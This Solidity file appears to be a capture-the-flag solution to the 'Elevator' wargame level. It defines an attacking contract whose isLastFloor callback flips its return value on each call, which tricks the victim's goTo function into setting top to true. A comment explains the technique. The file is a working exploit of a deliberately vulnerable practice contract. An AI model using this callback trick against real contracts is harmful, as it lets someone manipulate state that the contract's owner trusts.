pragma solidity ^0.4.18;

import "./Elevator.sol";

/**
In Elevator.sol, for top to be true, we need the isLastFloor function to return false
the first time it is called, and true the second time (no matter the value of the input param).
Therefore, we build such a function in this contract.
The attack function is implemented to call the victim contract's goTo function from this contract.
*/
contract ElevatorAttack {
    bool last = true;

    function isLastFloor(uint _floor) public returns(bool) {
        last = !last;
        return last;
    }

    function attack(address _victim) public {
        Elevator victim = Elevator(_victim);
        victim.goTo(20);
        // Or _victim.call(bytes4(keccak256("goTo(uint256)")), 20);
    }
}
